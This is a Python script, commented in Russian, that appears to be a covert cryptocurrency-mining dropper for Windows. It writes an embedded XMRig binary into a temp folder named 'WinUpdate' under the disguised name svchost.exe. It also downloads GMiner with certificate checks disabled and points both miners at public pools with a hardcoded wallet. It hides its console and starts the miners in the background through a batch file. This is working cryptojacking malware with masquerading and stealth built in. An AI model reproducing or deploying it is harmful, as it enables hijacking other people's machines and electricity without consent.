import os
import sys
import ctypes
import subprocess
import base64
import shutil
import winreg
import tempfile
import time
import threading
import json
import urllib.request
import zipfile
import ssl

# ==================== ВСТАВЬТЕ ВАШ BASE64 XMRig ЗДЕСЬ ====================
XMRIG_B64 = " "  # ВАША СТРОКА из xmrig_base64_oneline.txt
# =========================================================================

WALLET = "4AWiYLuHnNLM3Wb7mhbPB45bsGqL75QT4boaMCL6fb5DHpUvtuWdC8z3NRZdVxG5ZaSC5pKoFRcHbaH32HWx5bkLNen8kcG"
POOL_CPU = "pool.supportxmr.com:3333"
POOL_GPU = "etc.2miners.com:2020"

ssl._create_default_https_context = ssl._create_unverified_context

def get_dir():
    """Используем Temp - всегда есть права"""
    d = os.path.join(tempfile.gettempdir(), "WinUpdate")
    os.makedirs(d, exist_ok=True)
    return d

def download_gpu_miner(install_dir):
    """Скачивание GMiner"""
    gpu_path = os.path.join(install_dir, "gpu.exe")
    
    if os.path.exists(gpu_path):
        return gpu_path
    
    print("[*] Скачивание GPU майнера...")
    url = "https://github.com/develsoftware/GMinerRelease/releases/download/3.46/gminer_3_46_windows64.zip"
    zip_path = os.path.join(tempfile.gettempdir(), "gminer.zip")
    
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=60) as r:
            with open(zip_path, 'wb') as f:
                f.write(r.read())
        
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(install_dir)
        
        # Ищем miner.exe
        for root, dirs, files in os.walk(install_dir):
            for f in files:
                if f == "miner.exe":
                    shutil.move(os.path.join(root, f), gpu_path)
                    break
        
        os.remove(zip_path)
        print("[+] GPU майнер готов")
        return gpu_path
    except Exception as e:
        print(f"[-] GPU майнер не загружен: {e}")
        return None

def install():
    install_dir = get_dir()
    
    # CPU майнер
    cpu_path = os.path.join(install_dir, "svchost.exe")
    with open(cpu_path, "wb") as f:
        f.write(base64.b64decode(XMRIG_B64))
    
    # Конфиг CPU
    cpu_config = {
        "cpu": {"enabled": True, "max-threads-hint": 100, "priority": 5},
        "pools": [{"url": POOL_CPU, "user": WALLET, "pass": "x", "tls": False}],
        "donate-level": 0
    }
    cpu_cfg_path = os.path.join(install_dir, "cpu.json")
    with open(cpu_cfg_path, "w") as f:
        json.dump(cpu_config, f)
    
    # GPU майнер
    gpu_path = download_gpu_miner(install_dir)
    
    # Создаём bat файл
    bat_path = os.path.join(install_dir, "start.bat")
    bat_content = f'@echo off\ncd /d "{install_dir}"\nstart /B "" "{cpu_path}" --config="{cpu_cfg_path}"\n'
    
    if gpu_path and os.path.exists(gpu_path):
        bat_content += f'start /B "" "{gpu_path}" --algo etchash --server {POOL_GPU} --user {WALLET}.gpu --tls 0\n'
    
    with open(bat_path, "w") as f:
        f.write(bat_content)
    
    return bat_path

def hide():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def run(bat_path):
    subprocess.Popen(f'"{bat_path}"', shell=True, creationflags=0x08000000)

def main():
    hide()
    try:
        bat = install()
        run(bat)
        print(f"[+] Запущено в: {tempfile.gettempdir()}\\WinUpdate")
    except Exception as e:
        print(f"[-] {e}")
        time.sleep(5)

if __name__ == "__main__":
    main()